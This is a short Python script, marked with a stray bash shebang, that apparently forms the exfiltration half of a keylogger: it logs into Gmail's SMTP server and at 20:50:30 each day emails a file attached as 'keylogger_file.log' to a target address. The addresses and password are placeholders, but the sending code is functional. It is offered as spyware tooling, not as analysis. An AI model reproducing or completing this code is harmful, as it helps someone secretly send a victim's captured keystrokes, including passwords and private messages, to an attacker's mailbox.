#! /bin/bash

import smtplib
from email.message import EmailMessage
import time


def smmtp_reqest():
    smtp_host = 'smtp.gmail.com'
    smtp_port = '465'
    sender = 'example@gmail.com' # who send
    password = '*********'  # send password for successful  authorization
    target = ['target@gmail.com']  # whome send

    msg = EmailMessage()
    msg['From'] = sender
    msg['Subject'] = 'File of logs'
    msg['To'] = target
    msg.set_content("File of logs")

    filepath = 'file_name_path'
    msg.add_attachment(open(filepath, "r").read(), filename="keylogger_file.log")

    s = smtplib.SMTP_SSL(smtp_host, smtp_port)
    # s.connect(smtp_host, smtp_port
    s.login(sender, password)
    s.send_message(msg)


if __name__ == '__main__':
    while True:
        timenow = time.localtime()
        if (timenow.tm_hour == 20) and (timenow.tm_min == 50) and (timenow.tm_sec == 30):
            smmtp_reqest()
